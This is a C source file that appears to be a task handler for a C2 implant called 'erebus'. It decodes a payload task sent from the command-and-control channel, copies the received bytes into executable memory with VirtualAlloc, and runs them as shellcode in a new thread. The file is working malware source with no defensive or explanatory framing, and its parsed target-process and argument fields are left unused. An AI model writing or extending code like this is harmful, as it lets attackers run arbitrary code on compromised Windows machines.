#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <stdlib.h>
#include <string.h>

#include "erebus/pb_c2.h"
#include "erebus/pb_wire.h"

typedef struct erebus_peload_task {
    uint8_t *pe_data;
    size_t   pe_data_len;
    char     method[64];
    char     args[256];
    uint32_t target_pid;
} erebus_peload_task;

static int decode_peload_task(const uint8_t *in, size_t in_len, erebus_peload_task *t) {
    memset(t, 0, sizeof(*t));
    erebus_pb_reader r;
    erebus_pb_reader_init(&r, in, in_len);
    uint32_t field;
    uint8_t wire;
    while (erebus_pb_reader_next(&r, &field, &wire)) {
        if (field == 1 && wire == 2) {
            const uint8_t *b;
            size_t n;
            if (erebus_pb_read_bytes(&r, &b, &n)) {
                t->pe_data = (uint8_t *)malloc(n);
                if (!t->pe_data) return 0;
                memcpy(t->pe_data, b, n);
                t->pe_data_len = n;
            }
        } else if (field == 2 && wire == 2) {
            const uint8_t *b;
            size_t n;
            if (erebus_pb_read_bytes(&r, &b, &n)) {
                size_t cpy = n < sizeof(t->method) - 1 ? n : sizeof(t->method) - 1;
                memcpy(t->method, b, cpy);
                t->method[cpy] = '\0';
            }
        } else if (field == 3 && wire == 2) {
            const uint8_t *b;
            size_t n;
            if (erebus_pb_read_bytes(&r, &b, &n)) {
                size_t cpy = n < sizeof(t->args) - 1 ? n : sizeof(t->args) - 1;
                memcpy(t->args, b, cpy);
                t->args[cpy] = '\0';
            }
        } else if (field == 4 && wire == 0) {
            uint64_t v;
            if (erebus_pb_read_varint(&r, &v)) t->target_pid = (uint32_t)v;
        } else {
            erebus_pb_skip(&r, wire);
        }
    }
    return t->pe_data && t->pe_data_len > 0;
}

static int run_shellcode(const uint8_t *sc, size_t sc_len) {
    void *mem = VirtualAlloc(NULL, sc_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!mem) return 0;
    memcpy(mem, sc, sc_len);
    HANDLE th = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)mem, NULL, 0, NULL);
    if (!th) { VirtualFree(mem, 0, MEM_RELEASE); return 0; }
    WaitForSingleObject(th, 30000);
    CloseHandle(th);
    VirtualFree(mem, 0, MEM_RELEASE);
    return 1;
}

int erebus_task_peload(const uint8_t *data, size_t data_len, uint8_t **out, size_t *out_len) {
    erebus_peload_task task;
    if (!decode_peload_task(data, data_len, &task)) return 0;

    int success = 0;
    if (strcmp(task.method, "shellcode") == 0 || strcmp(task.method, "") == 0 || task.pe_data_len < 4096) {
        success = run_shellcode(task.pe_data, task.pe_data_len);
    }

    int ok = erebus_pb_encode_peload_result(success, NULL, 0, out, out_len);
    free(task.pe_data);
    return ok;
}